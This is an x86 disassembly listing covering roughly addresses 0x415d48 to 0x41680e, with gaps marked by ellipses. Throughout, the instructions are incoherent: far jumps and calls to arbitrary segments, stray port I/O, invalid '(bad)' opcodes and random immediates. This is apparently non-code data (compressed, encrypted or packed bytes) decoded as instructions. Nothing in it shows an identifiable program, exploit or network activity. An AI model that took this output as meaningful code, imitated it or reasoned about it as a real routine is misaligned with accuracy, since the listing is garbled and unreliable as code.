  415d48:	test   BYTE PTR [eax],0x0
  415d4b:	add    ch,al
  415d4d:	fild   QWORD PTR [edx+esi*4-0x5e]
  415d51:	cmp    DWORD PTR [edi+0x591e29e3],esi
  415d57:	add    DWORD PTR [esi],edi
  415d59:	clc    
  415d5a:	rol    esp,0xc8
  415d5d:	in     al,dx
  415d5e:	ss dec ebp
  415d60:	mov    al,0xc2
  415d63:	(bad)  
  415d64:	jb     0x415dc6
  415d66:	test   DWORD PTR [ecx+ebx*2-0x75275fb8],ebp
  415d6d:	pop    ebx
  415d6e:	xchg   edx,eax
  415d6f:	loopne 0x415d44
  415d71:	xor    esi,DWORD PTR [esi]
  415d73:	shl    dh,0x81
  415d76:	in     eax,dx
  415d77:	mov    bh,0xa7
  415d79:	lods   eax,DWORD PTR ds:[esi]
  415d7a:	in     al,0x46
  415d7c:	sbb    bl,BYTE PTR [eax-0x32f5a372]
  415d82:	pusha  
  415d83:	jbe    0x415dd7
  415d85:	js     0x415d73
  415d87:	fnsave [eax-0x131a56b0]
  415d8d:	mov    esi,0xc9b5d0f2
  415d92:	ret    
  415d93:	cdq    
  415d94:	pop    ebp
  415d95:	out    0xa3,eax
  415d97:	(bad)  
  415d98:	cld    
  415d99:	sbb    ch,0x35
  415d9c:	xor    eax,edx
  415d9e:	sbb    DWORD PTR [edi],eax
  415da0:	push   es
  415da1:	mov    cl,cl
  415da3:	push   ds
  415da4:	pop    edi
  415da5:	les    esi,FWORD PTR [esi+0x2acc4dfb]
  415dab:	xor    eax,0xa8b02f47
  415db0:	loopne 0x415db9
  415db2:	mov    esp,eax
  415db4:	nop
  415db5:	push   esi
  415db6:	mov    al,0x82
  415db8:	out    0x50,eax
  415dba:	loope  0x415d60
  415dbc:	jb     0x415e11
  415dbe:	mov    esp,0xef874de9
  415dc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dc4:	rcr    DWORD PTR [esi*8+0x7141afe9],cl
  415dcb:	dec    edi
  415dcc:	vmwrite ecx,eax
  415dcf:	or     DWORD PTR [ecx-0x332beade],0x8
  415dd6:	xchg   esp,eax
  415dd7:	rol    DWORD PTR [ecx-0x75],0x54
  415ddb:	aad    0xca
  415ddd:	or     DWORD PTR [eax+0x2d],ebx
  415de0:	add    BYTE PTR [edx-0x80],0x4c
  415de4:	leave  
  415de5:	in     al,dx
  415de6:	ins    BYTE PTR es:[edi],dx
  415de7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415de8:	retf   
  415de9:	ret    0x2917
  415dec:	out    0xe7,eax
  415dee:	jle    0x415e0a
  415df0:	jne    0x415e36
  415df2:	cmp    eax,0x511c9b93
  415df7:	cdq    
  415df8:	or     edx,eax
  415dfa:	mov    edi,gs
  415dfc:	mov    ebp,0xac63ae80
  415e01:	je     0x415e12
  415e03:	test   DWORD PTR [edx+ebp*8-0x168b45ac],eax
  415e0a:	fcmovb st,st(1)
  415e0d:	(bad)  
  415e0e:	jp     0x415e04
  415e10:	lods   al,BYTE PTR ds:[esi]
  415e11:	arpl   WORD PTR [edx-0x21a77b70],bp
  415e17:	ins    BYTE PTR es:[edi],dx
  415e18:	xchg   DWORD PTR [eax-0x1e],edi
  415e1b:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e1d:	push   es
  415e1e:	pop    eax
  415e1f:	dec    esp
  415e20:	test   ah,bh
  415e22:	pop    DWORD PTR [esi]
  415e24:	adc    dl,BYTE PTR [eax+ebx*1-0x241184d3]
  415e2b:	dec    esp
  415e2c:	push   eax
  415e2d:	cmp    ecx,edx
  415e2f:	inc    edx
  415e30:	cmp    edx,DWORD PTR [edx+esi*4]
  415e33:	dec    ecx
  415e34:	fcmovnbe st,st(0)
  415e36:	sahf   
  415e37:	mov    ds:0xbde8283,al
  415e3c:	popa   
  415e3d:	and    bh,al
  415e3f:	dec    edx
  415e40:	out    0x6,al
	...
  415eb2:	add    BYTE PTR [eax],al
  415eb4:	aaa    
  415eb5:	data16 xor al,0x9b
  415eb8:	jne    0x415e95
  415eba:	mov    edi,0xdeb84bee
  415ebf:	gs pop esp
  415ec1:	cmp    al,0xd4
  415ec3:	jl     0x415ee3
  415ec5:	lock add BYTE PTR [eax],al
  415ec8:	test   BYTE PTR [eax],0x0
  415ecb:	add    BYTE PTR [edi+0x1],ch
  415ece:	(bad)  
  415ecf:	nop
  415ed0:	push   ds
  415ed1:	xor    bl,BYTE PTR [esi+0x3f]
  415ed4:	inc    eax
  415ed5:	lea    esp,[ecx]
  415ed7:	repz loope 0x415f11
  415eda:	or     al,0x99
  415edc:	out    0x6,al
  415ede:	or     DWORD PTR [eax+0xf],0xffffff93
  415ee2:	scas   al,BYTE PTR es:[edi]
  415ee3:	xchg   DWORD PTR [ecx],edx
  415ee5:	ror    BYTE PTR [edi],0x7
  415ee8:	jns    0x415eae
  415eea:	inc    esp
  415eeb:	jbe    0x415e95
  415eed:	mov    cl,0x20
  415eef:	inc    ah
  415ef1:	lock xchg BYTE PTR [edx-0x39],cl
  415ef5:	or     BYTE PTR [edi-0x66fc83db],bl
  415efb:	mov    dh,0x98
  415efd:	xchg   BYTE PTR [edi],bh
  415eff:	inc    esp
  415f00:	jmp    0x1d04:0xca79e601
  415f07:	pusha  
  415f08:	push   edx
  415f09:	aaa    
  415f0a:	dec    ecx
  415f0b:	aas    
  415f0c:	out    0xf6,al
  415f0e:	mov    al,0x28
  415f10:	push   es
  415f11:	and    eax,0x35ca9cdc
  415f16:	inc    esp
  415f17:	cwde   
  415f18:	sub    BYTE PTR [ecx-0x8],cl
  415f1b:	aaa    
  415f1c:	call   0x144b:0xef0b07da
  415f23:	push   edi
  415f24:	ret    
  415f25:	mov    ch,0x83
  415f27:	pop    esp
  415f28:	mov    bl,0x71
  415f2a:	aad    0x31
  415f2c:	ficom  DWORD PTR [ebp-0x4255dcda]
  415f33:	cmp    eax,0xa8b34976
  415f38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f39:	xchg   edi,eax
  415f3a:	push   ds
  415f3b:	retf   
  415f3c:	inc    edx
  415f3d:	dec    eax
  415f3e:	mov    ebp,0xad29a527
  415f43:	call   0x16b0:0x1eeed733
  415f4a:	jg     0x415fc6
  415f4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f4d:	mov    BYTE PTR [edi],dl
  415f4f:	cmp    al,0x4e
  415f51:	test   al,0xc6
  415f53:	pop    edi
  415f54:	add    cl,ch
  415f56:	dec    edi
  415f57:	mov    ebx,0xe2389e4b
  415f5c:	ins    BYTE PTR es:[edi],dx
  415f5d:	or     dl,ch
  415f5f:	push   esp
  415f60:	sbb    ebp,DWORD PTR [ebx+eax*1+0x2b72b043]
  415f67:	dec    ebp
  415f68:	xor    eax,0x1892dbf8
  415f6d:	jmp    0x415f6f
  415f6f:	cmc    
  415f70:	sub    ch,BYTE PTR [eax+0x3e2fd7ee]
  415f76:	push   ebp
  415f77:	sub    dh,BYTE PTR [edi-0x4c]
  415f7a:	add    DWORD PTR [ebp-0x2],ebp
  415f7d:	sbb    al,dl
  415f7f:	loop   0x415ff6
  415f81:	jae    0x415fad
  415f83:	and    eax,0xc335d34a
  415f88:	and    bh,BYTE PTR [edi]
  415f8a:	sbb    eax,0xc40e1781
  415f8f:	stc    
  415f90:	leave  
  415f91:	dec    ecx
  415f92:	push   edi
  415f93:	pusha  
  415f94:	cwde   
  415f95:	leave  
  415f96:	fst    QWORD PTR [esi+0x40959c77]
  415f9c:	outs   dx,DWORD PTR ds:[esi]
  415f9d:	push   ds
  415f9e:	out    0x4b,eax
  415fa0:	in     eax,dx
  415fa1:	cld    
  415fa2:	stos   BYTE PTR es:[edi],al
  415fa3:	ins    BYTE PTR es:[edi],dx
  415fa4:	sub    al,0x3e
  415fa6:	bound  edi,QWORD PTR [esi-0x16]
  415fa9:	or     BYTE PTR [esi+0x527df3b8],dl
  415faf:	mov    ds:0xeb022e9f,al
  415fb4:	test   BYTE PTR [edi+ecx*2+0x70],bl
  415fb8:	mov    al,ds:0xbe527416
  415fbd:	jns    0x415f54
  415fbf:	inc    ecx
  415fc0:	hlt    
  415fc1:	jge    0x415fc3
	...
  416033:	add    BYTE PTR [ebx+0x2],bh
  416036:	add    ebp,ebx
  416038:	jnp    0x416025
  41603a:	sti    
  41603b:	xchg   edx,eax
  41603c:	rol    al,cl
  41603e:	(bad)  
  41603f:	imul   edx,DWORD PTR [edi-0x10],0xffffffd8
  416043:	and    DWORD PTR [ecx+esi*8],edx
  416046:	add    BYTE PTR [eax],al
  416048:	test   BYTE PTR [eax],0x0
  41604b:	add    BYTE PTR [edi-0x7e8d5861],ah
  416051:	mov    eax,0x61b3bf8e
  416056:	daa    
  416057:	pop    ebp
  416058:	stc    
  416059:	lea    esi,[eax+0xc]
  41605c:	mov    edi,0xe3a4bddb
  416061:	cwde   
  416062:	pop    esp
  416063:	mov    eax,ds:0x448aa930
  416068:	mov    bh,0x13
  41606a:	jle    0x416011
  41606c:	push   ecx
  41606d:	lods   al,BYTE PTR ds:[esi]
  41606e:	fs cwde 
  416070:	out    dx,al
  416071:	add    bh,BYTE PTR [ebx+eax*4-0x1c6d8981]
  416078:	jno    0x416039
  41607a:	dec    ecx
  41607b:	repnz inc ecx
  41607d:	push   edi
  41607e:	std    
  41607f:	outs   dx,BYTE PTR ds:[esi]
  416080:	outs   dx,DWORD PTR ds:[esi]
  416081:	cmp    ecx,DWORD PTR [ebx+0x16306376]
  416087:	lahf   
  416088:	and    bl,BYTE PTR [ebx-0x10]
  41608b:	sbb    cl,BYTE PTR [edi+0x1c]
  41608e:	push   edx
  41608f:	push   esp
  416090:	ret    0x7e10
  416093:	fsub   st,st(7)
  416095:	aad    0xdd
  416097:	mov    esi,DWORD PTR [eax+0x5e9273a3]
  41609d:	nop
  41609e:	mov    dl,0xbc
  4160a0:	popf   
  4160a1:	xor    eax,0x7ea5ca62
  4160a6:	cdq    
  4160a7:	fadd   st(2),st
  4160a9:	jg     0x416119
  4160ab:	rcr    BYTE PTR [ebx-0x3f],1
  4160ae:	sub    DWORD PTR gs:[ebx+0x36e4e260],edi
  4160b5:	pushf  
  4160b6:	dec    eax
  4160b7:	pop    esi
  4160b8:	add    dh,0xff
  4160bb:	pop    ebx
  4160bc:	call   0xfeab:0xda854852
  4160c3:	mov    bl,0x63
  4160c5:	inc    ebp
  4160c6:	sbb    al,0xdd
  4160c8:	pop    es
  4160c9:	push   esp
  4160ca:	pop    ds
  4160cb:	cdq    
  4160cc:	push   ss
  4160cd:	loope  0x416064
  4160cf:	(bad)  [ebp+0x43]
  4160d2:	fs cli 
  4160d4:	test   eax,0x21802684
  4160d9:	rcl    BYTE PTR [eax-0x73cd2d7d],0x1b
  4160e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160e1:	in     al,dx
  4160e2:	rol    BYTE PTR [esi+0x1a],0x50
  4160e6:	jb     0x41607d
  4160e8:	xchg   ecx,eax
  4160e9:	out    dx,al
  4160ea:	sub    al,0xe5
  4160ec:	stc    
  4160ed:	and    bh,BYTE PTR [ebx-0x68e4ddf8]
  4160f3:	nop
  4160f4:	mov    ebx,0xa6b13cda
  4160f9:	daa    
  4160fa:	imul   esi,ebp,0xfa97a8dd
  416100:	adc    ebx,DWORD PTR [ecx+ebp*2]
  416103:	jb     0x416183
  416105:	imul   edi,DWORD PTR [eax+0xce97b37],0x1ea50dbc
  41610f:	dec    eax
  416110:	inc    esp
  416111:	cli    
  416112:	(bad)  
  416113:	sbb    edi,DWORD PTR [ebx]
  416115:	popf   
  416116:	or     eax,0xedcdd33d
  41611b:	jl     0x416154
  41611d:	sub    ch,BYTE PTR [edi]
  41611f:	sbb    DWORD PTR [ecx],edx
  416121:	(bad)  
  416122:	in     eax,0x50
  416124:	or     al,0x31
  416126:	pop    esp
  416127:	hlt    
  416128:	xor    DWORD PTR [ebx+edi*1+0x1],0xfffffff9
  41612d:	test   DWORD PTR ds:0x71526ac2,ecx
  416133:	adc    al,0xed
  416135:	popa   
  416136:	imul   ebp,DWORD PTR [bx+si-0x37a0],0x11b11903
  41613f:	sbb    BYTE PTR [ebx+0x96],ch
	...
  4161b1:	add    BYTE PTR [eax],al
  4161b3:	add    BYTE PTR [edi+edx*4],ch
  4161b6:	pop    ds
  4161b7:	sar    DWORD PTR [edi-0x8001127],1
  4161bd:	test   al,0xcb
  4161bf:	sub    esi,DWORD PTR [edx*4-0xdf5bbf2]
  4161c6:	add    BYTE PTR [eax],al
  4161c8:	test   BYTE PTR [eax],0x0
  4161cb:	add    al,dl
  4161cd:	ins    DWORD PTR es:[edi],dx
  4161ce:	ret    
  4161cf:	sub    dl,0x4f
  4161d2:	rcr    DWORD PTR [esi],1
  4161d4:	mov    ebx,0x862d96de
  4161d9:	addr16 leave 
  4161db:	lods   eax,DWORD PTR ds:[esi]
  4161dc:	and    al,0xc4
  4161de:	js     0x416254
  4161e0:	daa    
  4161e1:	xchg   ebx,eax
  4161e2:	sub    BYTE PTR [ebx-0x73],al
  4161e5:	xor    cl,0x4
  4161e8:	add    eax,eax
  4161ea:	jb     0x416183
  4161ec:	xchg   esi,eax
  4161ed:	test   ebx,eax
  4161ef:	dec    ebp
  4161f0:	push   ss
  4161f1:	data16 rcr BYTE PTR [ebx-0x2c540eee],1
  4161f8:	sub    DWORD PTR [edx],esp
  4161fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161fb:	daa    
  4161fc:	sti    
  4161fd:	fisub  DWORD PTR [ecx+ebx*2-0x44]
  416201:	cmp    ah,BYTE PTR [edx]
  416203:	jb     0x41622e
  416205:	dec    ecx
  416206:	jae    0x4161f0
  416208:	les    edi,FWORD PTR [ecx+eiz*2+0xd]
  41620c:	pop    ds
  41620d:	div    DWORD PTR [esi]
  41620f:	mov    DWORD PTR [esi+0x39919dee],esp
  416215:	jmp    0xb1c8b3c8
  41621a:	jmp    0x416230
  41621c:	(bad)  
  41621d:	adc    eax,DWORD PTR ss:[edi]
  416220:	mov    dh,dh
  416222:	add    bl,cl
  416224:	pop    edi
  416225:	retf   0x9c13
  416228:	or     ebp,ecx
  41622a:	stos   DWORD PTR es:[edi],eax
  41622b:	and    DWORD PTR [esp+ebx*4+0x16],edx
  41622f:	mov    edi,0x86b67987
  416234:	mov    bh,0xe0
  416236:	pop    es
  416237:	jecxz  0x416297
  416239:	push   ebx
  41623a:	mov    edi,0x844f3081
  41623f:	add    ah,dl
  416241:	push   edi
  416242:	and    bl,BYTE PTR [ecx+0x60]
  416245:	push   es
  416246:	xchg   ecx,eax
  416247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416248:	jbe    0x41621f
  41624a:	fsubr  DWORD PTR [eax+0x6c2d9c59]
  416250:	adc    eax,0x50acb5f5
  416255:	jmp    0x8b8e:0x242136b7
  41625c:	retf   0x479c
  41625f:	in     eax,0xef
  416261:	test   ah,0x74
  416264:	add    cl,BYTE PTR [ebx+0x3937f2ba]
  41626a:	dec    esi
  41626b:	ss jge 0x4162b8
  41626e:	dec    esp
  41626f:	push   0xffffffa4
  416271:	out    0xdf,eax
  416273:	inc    esp
  416274:	adc    eax,0xda2f066e
  416279:	ja     0x4162d9
  41627b:	arpl   cx,bx
  41627d:	add    ebp,DWORD PTR [edx+0x75fd2cfe]
  416283:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416284:	hlt    
  416285:	cmp    BYTE PTR [edi+0x659a06d4],bl
  41628b:	ror    esp,1
  41628d:	or     esi,eax
  41628f:	mov    WORD PTR [edi],es
  416291:	in     al,dx
  416292:	outs   dx,DWORD PTR ds:[esi]
  416293:	adc    ebx,DWORD PTR [ecx-0x1e]
  416296:	and    bh,bl
  416298:	or     eax,0xd79cafaa
  41629d:	dec    esp
  41629e:	sbb    ebx,DWORD PTR [ecx-0x3b]
  4162a1:	adc    al,0x40
  4162a3:	shl    BYTE PTR [edx+0x61],cl
  4162a6:	dec    edi
  4162a7:	lods   al,BYTE PTR ds:[esi]
  4162a8:	adc    eax,DWORD PTR [esi-0x6a]
  4162ab:	xor    DWORD PTR [eax-0x53ae152e],esp
  4162b1:	dec    ecx
  4162b2:	mov    WORD PTR [ecx+0x42],?
  4162b5:	inc    eax
  4162b6:	sub    BYTE PTR [esi-0x492ea602],bl
  4162bc:	int    0xc1
  4162be:	or     ch,BYTE PTR [ebx]
  4162c0:	addr16 push es
	...
  416332:	add    BYTE PTR [eax],al
  416334:	ins    DWORD PTR es:[edi],dx
  416335:	lock repz jmp FWORD PTR cs:[edi]
  41633a:	std    
  41633b:	repz push eax
  41633d:	xchg   ecx,eax
  41633e:	scas   al,BYTE PTR es:[edi]
  41633f:	fst    QWORD PTR [ebx+0x1a]
  416342:	pop    edi
  416343:	stos   BYTE PTR es:[edi],al
  416344:	add    bl,dh
  416346:	add    BYTE PTR [eax],al
  416348:	test   BYTE PTR [eax],0x0
  41634b:	add    BYTE PTR [edi+0x20de6ba2],ah
  416351:	or     DWORD PTR [ebp-0x77df9048],edi
  416357:	xchg   ebp,eax
  416358:	sub    al,0xbe
  41635a:	push   ebx
  41635b:	clc    
  41635c:	leave  
  41635d:	sbb    dh,BYTE PTR [edx+edi*2-0x24]
  416361:	(bad)  [edx+0x3cf28a56]
  416367:	ror    DWORD PTR [esi+edx*4],1
  41636a:	inc    ebp
  41636b:	dec    edx
  41636c:	pop    DWORD PTR [eax-0x58]
  41636f:	push   edi
  416370:	cmp    bl,BYTE PTR ds:0x37404f5d
  416376:	out    dx,al
  416377:	sbb    BYTE PTR [edx-0x1c],0x3f
  41637b:	stc    
  41637c:	std    
  41637d:	xlat   BYTE PTR ds:[ebx]
  41637e:	test   eax,0xe24b2ac9
  416383:	pop    edx
  416384:	out    0x42,al
  416386:	mov    eax,ds:0x2a5fa081
  41638b:	xchg   edi,eax
  41638c:	sbb    DWORD PTR [edx+0x585edfcd],0xc568b660
  416396:	mov    WORD PTR [edx],?
  416398:	ret    0x4555
  41639b:	inc    ebp
  41639c:	ins    BYTE PTR es:[edi],dx
  41639d:	push   esp
  41639e:	push   es
  41639f:	sbb    eax,0xf31a9fff
  4163a4:	xchg   ebx,eax
  4163a5:	daa    
  4163a6:	adc    BYTE PTR [ebx-0x7acfc055],dh
  4163ac:	and    BYTE PTR [ecx-0x3f5b0370],0x9a
  4163b3:	jae    0x416386
  4163b5:	ins    BYTE PTR es:[edi],dx
  4163b6:	gs pop ebp
  4163b8:	inc    esi
  4163b9:	mov    edi,0x649d2f9e
  4163be:	and    eax,0x9f556fd
  4163c3:	pusha  
  4163c4:	outs   dx,DWORD PTR ds:[esi]
  4163c5:	cli    
  4163c6:	jmp    FWORD PTR [ebp+0x58]
  4163c9:	rep lods al,BYTE PTR ds:[esi]
  4163cb:	div    BYTE PTR [edi+0x19fb934c]
  4163d1:	cmp    cl,cl
  4163d3:	mov    al,ds:0xf47f7329
  4163d8:	mov    edx,0x32bd33ad
  4163dd:	(bad)  
  4163de:	nop
  4163df:	jecxz  0x41637d
  4163e1:	in     al,0xd4
  4163e3:	call   0x2288:0x98710f70
  4163ea:	mov    dl,0x63
  4163ec:	mov    dh,0x98
  4163ee:	scas   eax,DWORD PTR es:[edi]
  4163ef:	sbb    dh,ah
  4163f1:	xor    BYTE PTR [eax+0x4da36339],dh
  4163f7:	addr16 inc ebx
  4163f9:	outs   dx,BYTE PTR ds:[esi]
  4163fa:	pop    ebx
  4163fb:	xchg   edx,ecx
  4163fd:	pop    edi
  4163fe:	dec    ebx
  4163ff:	cld    
  416400:	data16 das 
  416402:	or     eax,0x2191b70f
  416407:	stc    
  416408:	cmp    BYTE PTR [edi-0x30324c1e],ah
  41640e:	adc    eax,0x333656be
  416413:	adc    bh,cl
  416415:	xor    DWORD PTR [ebp+0x29],ebx
  416418:	dec    edx
  416419:	(bad)  
  41641b:	jae    0x4163b4
  41641d:	cmp    esp,DWORD PTR [eax+0x38d0047]
  416423:	xchg   edi,eax
  416424:	(bad)  
  416425:	(bad)  
  416426:	mov    ss,ebx
  416428:	imul   ebp,edi,0xffffffad
  41642b:	and    ebx,ebp
  41642d:	add    esi,DWORD PTR [ecx+0x767e696d]
  416433:	add    esi,DWORD PTR [esi]
  416435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416436:	ret    
  416437:	lds    edx,FWORD PTR [edx+ebx*1+0x1b]
  41643b:	sub    al,0xdf
  41643d:	imul   ecx,DWORD PTR [ecx+0x5ae90a],0x0
	...
  4164b3:	add    ah,ah
  4164b5:	lock sub DWORD PTR [edx],ecx
  4164b8:	cmp    eax,0x4cfee7db
  4164bd:	or     BYTE PTR [ebx-0xa],ah
  4164c0:	and    eax,0xf6f4b009
  4164c5:	repz add BYTE PTR [eax],al
  4164c8:	test   BYTE PTR [eax],0x0
  4164cb:	add    BYTE PTR ds:0xc9c0cea1,ch
  4164d1:	loopne 0x416479
  4164d3:	mov    ds:0x9068772e,al
  4164d8:	mov    dh,ah
  4164da:	les    esi,FWORD PTR [esi]
  4164dc:	sbb    BYTE PTR [ebx],ah
  4164de:	adc    bh,dh
  4164e0:	lahf   
  4164e1:	push   eax
  4164e2:	or     dh,0xcb
  4164e5:	mov    esi,0x67aa4310
  4164ea:	mov    edx,0x57c8d99b
  4164ef:	cdq    
  4164f0:	adc    esp,DWORD PTR [ebx-0x30]
  4164f3:	mov    ds:0xf9460368,al
  4164f8:	pop    DWORD PTR [esi-0x767ec293]
  4164fe:	push   cs
  4164ff:	xchg   ebx,eax
  416500:	xor    bh,al
  416502:	sbb    DWORD PTR [edx-0x9c739d4],ebx
  416508:	int    0x50
  41650a:	sbb    eax,0x727f1c1f
  41650f:	inc    eax
  416510:	cmp    al,ah
  416512:	inc    ebp
  416513:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416514:	cli    
  416515:	fiadd  WORD PTR [edi+ebp*1]
  416518:	mov    bh,0x3a
  41651a:	mov    bl,0xf8
  41651c:	pop    ebx
  41651d:	sbb    esi,DWORD PTR [edx]
  41651f:	les    ecx,FWORD PTR [ecx+0x6d]
  416522:	pop    ebp
  416523:	sahf   
  416524:	lods   eax,DWORD PTR ds:[esi]
  416525:	(bad)  
  416526:	and    esp,esi
  416528:	push   ebx
  416529:	scas   eax,DWORD PTR es:[edi]
  41652a:	mov    ecx,0xc240f69f
  41652f:	push   eax
  416530:	add    al,0x4b
  416532:	inc    edi
  416533:	mov    ebp,ecx
  416535:	es in  al,0xec
  416538:	sub    al,0xaa
  41653a:	aad    0xf4
  41653c:	mov    al,ds:0xfa545d0d
  416541:	push   0x5
  416543:	adc    eax,0x89c6474b
  416548:	sbb    BYTE PTR [ebp+0x6c],ch
  41654b:	or     BYTE PTR [ecx-0x66],0x0
  41654f:	fdiv   st,st(4)
  416551:	push   edx
  416552:	hlt    
  416553:	in     al,dx
  416554:	clc    
  416555:	add    al,0xf5
  416557:	pushf  
  416558:	call   0xaa323bef
  41655d:	out    dx,eax
  41655e:	or     edi,DWORD PTR [ebx+0x64]
  416561:	scas   al,BYTE PTR es:[edi]
  416562:	jge    0x416571
  416564:	cli    
  416565:	fs add edx,ecx
  416568:	inc    edx
  416569:	sbb    DWORD PTR [edi+0x78],eax
  41656c:	pop    edx
  41656d:	dec    esi
  41656e:	adc    BYTE PTR ds:0x3a2fd021,dh
  416574:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416575:	push   eax
  416576:	rol    DWORD PTR ds:0x5c9d5068,cl
  41657c:	test   eax,0xe6b73c86
  416581:	sub    DWORD PTR [ecx+0x74],edx
  416584:	bound  eax,QWORD PTR es:0x999764ba
  41658b:	(bad)  
  41658c:	cmc    
  41658d:	pop    es
  41658e:	or     eax,0xf9c7c213
  416593:	push   es
  416594:	in     al,dx
  416595:	or     cl,ch
  416597:	addr16 mov edi,0x83791e5d
  41659d:	ja     0x4165b4
  41659f:	dec    esp
  4165a0:	enter  0x3840,0xbc
  4165a4:	aaa    
  4165a5:	lahf   
  4165a6:	cmovb  ecx,DWORD PTR [edi]
  4165a9:	in     al,dx
  4165aa:	cwde   
  4165ab:	sbb    BYTE PTR [ebx+0x47680496],0x33
  4165b2:	xor    BYTE PTR [esi],bl
  4165b4:	dec    eax
  4165b5:	push   DWORD PTR [edi-0x54ad6ba5]
  4165bb:	test   BYTE PTR [edx+0x4],0xbb
  4165bf:	je     0x416596
  4165c1:	jl     0x4165c3
	...
  416633:	add    BYTE PTR [ebp-0x66],ch
  416636:	mov    esp,0xfd67ff45
  41663b:	mov    edx,0xd5f418cb
  416640:	scas   al,BYTE PTR es:[edi]
  416641:	mov    edx,0xf4ec6003
  416646:	add    BYTE PTR [eax],al
  416648:	test   BYTE PTR [eax],0x0
  41664b:	add    BYTE PTR [edx],ch
  41664d:	cmp    BYTE PTR [esi-0xf],bl
  416650:	adc    al,0x41
  416652:	call   0x19:0xbc43ee15
  416659:	mov    dh,0xd6
  41665b:	sub    DWORD PTR [eax+0x3a091464],esi
  416661:	(bad)  
  416662:	out    dx,eax
  416663:	fs loope 0x4166aa
  416666:	push   0xffffff8f
  416668:	(bad)  
  416669:	jl     0x4165f3
  41666b:	test   al,0x84
  41666d:	or     esi,DWORD PTR [ecx+0x4ac08ba]
  416673:	and    BYTE PTR [edx+edi*8],al
  416676:	push   edi
  416677:	mov    BYTE PTR [edi+0x789ec115],dh
  41667d:	mov    eax,ds:0x49cabd3e
  416682:	pop    ds
  416683:	dec    ecx
  416684:	fstp   QWORD PTR [ecx-0x72]
  416687:	xor    al,0xa2
  416689:	mov    edi,0x4cc8bdc4
  41668e:	pop    es
  41668f:	ds pop bx
  416692:	ficom  WORD PTR ss:[ecx+ecx*2-0x3cca93e4]
  41669a:	push   ebp
  41669b:	hlt    
  41669c:	add    DWORD PTR [esi+0x45],0xa9067bb3
  4166a3:	pop    ebp
  4166a4:	test   al,0xd3
  4166a6:	scas   eax,DWORD PTR es:[edi]
  4166a7:	popf   
  4166a8:	vpsubd ymm4,ymm7,YMMWORD PTR [esi]
  4166ac:	ror    BYTE PTR [esi],cl
  4166ae:	dec    ecx
  4166af:	in     al,0x1c
  4166b1:	push   esi
  4166b2:	fnsave [edx+edi*4-0x13]
  4166b6:	xchg   ebp,eax
  4166b7:	jbe    0x41667d
  4166b9:	xor    ebp,ebx
  4166bb:	scas   eax,DWORD PTR es:[edi]
  4166bc:	hlt    
  4166bd:	xchg   edx,eax
  4166be:	ja     0x416653
  4166c0:	mov    BYTE PTR [ebx],al
  4166c2:	mov    edx,0xb1e99784
  4166c7:	xor    al,0x2b
  4166c9:	or     bl,ch
  4166cb:	jle    0x4166e4
  4166cd:	jmp    0x8478fd9
  4166d2:	rcr    DWORD PTR [ebp+0x686ed10e],1
  4166d8:	or     al,bl
  4166da:	xchg   ebx,eax
  4166db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166dc:	je     0x416724
  4166de:	sub    eax,0x24ef7604
  4166e3:	cmp    dl,BYTE PTR [eax+0x43eb0405]
  4166e9:	pushf  
  4166ea:	(bad)  
  4166eb:	je     0x4166ea
  4166ed:	in     eax,dx
  4166ee:	aas    
  4166ef:	int    0xc0
  4166f1:	clc    
  4166f2:	or     dh,BYTE PTR [esi-0x56]
  4166f5:	out    dx,eax
  4166f6:	jecxz  0x416697
  4166f8:	xchg   esp,eax
  4166f9:	sbb    al,0x1e
  4166fb:	sub    BYTE PTR [eax],ah
  4166fd:	jle    0x4166b9
  4166ff:	mov    dh,0xd0
  416701:	fist   WORD PTR [ecx+0x10612ac9]
  416707:	out    0xd7,eax
  416709:	fxam   
  41670b:	repnz retf 0xb59a
  41670f:	mov    ds:0x69b93df9,eax
  416714:	aam    0x4f
  416716:	shl    DWORD PTR [edi],0xc
  416719:	cli    
  41671a:	and    cl,BYTE PTR [edi]
  41671c:	les    edi,FWORD PTR [ebp+0x62]
  41671f:	(bad)  
  416720:	sbb    eax,0x2d8b14ef
  416725:	xchg   ebx,eax
  416726:	jno    0x416703
  416728:	dec    eax
  416729:	sub    ebx,esp
  41672b:	retf   0xc79a
  41672e:	sbb    edx,DWORD PTR [ecx+0x1563cba2]
  416734:	ins    DWORD PTR es:[edi],dx
  416735:	(bad)  
  416736:	lock mov edi,0xef92d61c
  41673c:	and    dh,BYTE PTR [edx+0x43]
  41673f:	mov    edx,0xf702
	...
  4167b4:	retf   
  4167b5:	(bad)  
  4167b6:	xchg   ebx,eax
  4167b7:	in     al,dx
  4167b8:	mov    bh,0xed
  4167ba:	(bad)  
  4167bb:	push   DWORD PTR [ecx+0x19]
  4167be:	comiss xmm2,DWORD PTR [ebx-0x1d903d5a]
  4167c5:	cmc    
  4167c6:	add    BYTE PTR [eax],al
  4167c8:	test   BYTE PTR [eax],0x0
  4167cb:	add    BYTE PTR [edi],cl
  4167cd:	mov    esi,0xeed7ec18
  4167d2:	mov    dh,0xb2
  4167d4:	push   edx
  4167d5:	ret    0xe1c6
  4167d8:	inc    eax
  4167d9:	test   al,0x98
  4167db:	lods   eax,DWORD PTR ds:[esi]
  4167dc:	inc    esi
  4167dd:	fistp  DWORD PTR [ecx*1+0x49b9056e]
  4167e4:	fcom   DWORD PTR [eax+0x1eb33627]
  4167ea:	add    DWORD PTR [ebx-0x662edee6],ebx
  4167f0:	ja     0x4167ac
  4167f2:	jbe    0x416781
  4167f4:	push   cs
  4167f5:	add    esp,esi
  4167f7:	js     0x41683f
  4167f9:	mov    edx,0x67674d84
  4167fe:	imul   esi,eax,0x22
  416801:	fmul   st(4),st
  416803:	and    DWORD PTR [edi-0x2b6ae505],esp
  416809:	mov    bh,0xf6
  41680b:	dec    edi
  41680c:	jg     0x41682e
  41680e:	bound  edx,QWORD PTR [edi-0x2f]
